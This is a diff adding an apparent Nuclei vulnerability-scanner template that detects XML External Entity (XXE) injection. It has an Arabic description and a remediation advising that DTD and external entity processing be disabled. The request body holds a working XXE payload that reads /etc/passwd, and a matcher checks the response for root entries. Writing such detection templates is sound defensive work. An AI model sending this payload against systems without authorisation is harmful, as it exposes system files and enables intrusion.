@@ -1,0 +1,29 @@
+id: xxe-xml-injection
+info:
+  name: XML External Entity (XXE) Injection Flaw
+  author: YemenScan-Core
+  severity: high
+  description: محلل ملفات XML يقوم بمعالجة الكيانات الخارجية، مما يتيح قراءة الملفات
+    المحلية وإجراء طلبات داخلية (SSRF).
+  remediation: تعطيل معالجة الكيانات الخارجية (Disable DTD / External Entities) في
+    جميع مكتبات معالجة XML.
+  tags:
+  - xxe
+  - xml
+  - injection
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/xml'
+  - '{{BaseURL}}/api/xml'
+  headers:
+    Content-Type: application/xml
+  body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+  matchers-condition: and
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
